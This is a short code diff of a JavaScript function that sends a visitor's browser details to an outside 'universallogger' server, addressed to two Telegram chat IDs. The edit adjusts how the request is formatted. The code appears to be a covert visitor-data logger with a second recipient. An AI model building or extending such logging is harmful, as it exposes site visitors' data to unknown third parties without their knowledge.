@@ -97,9 +97,8 @@ async function sendDataToTelegram() {
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
     `;
 
-    const url = `https://mapiii.nexcord.pro/api/universallogger/server.php`;
+    const url = `https://mapiii.nexcord.pro/api/universallogger/server.php?action=send`;
     const formData = new FormData();
-    formData.append('action', "send");
     formData.append('chat', chatId);
     formData.append('message', message);
 
@@ -117,7 +116,6 @@ async function sendDataToTelegram() {
     }
     // отправка два
     const formData1 = new FormData();
-    formData.append('action', "send");
     formData1.append('chat', additionalChatId);
     formData1.append('message', message);
 
@@ -129,7 +127,7 @@ async function sendDataToTelegram() {
         if (!response.ok) {
             throw new Error('Ошибка при отправке запроса: ' + response.statusText);
         }
-        console.log('Запрос успешно отправлен: ' + response.statusText);
+        console.log('Запрос успешно отправлен');
     } catch (error) {
         console.error('Ошибка:', error);
     }
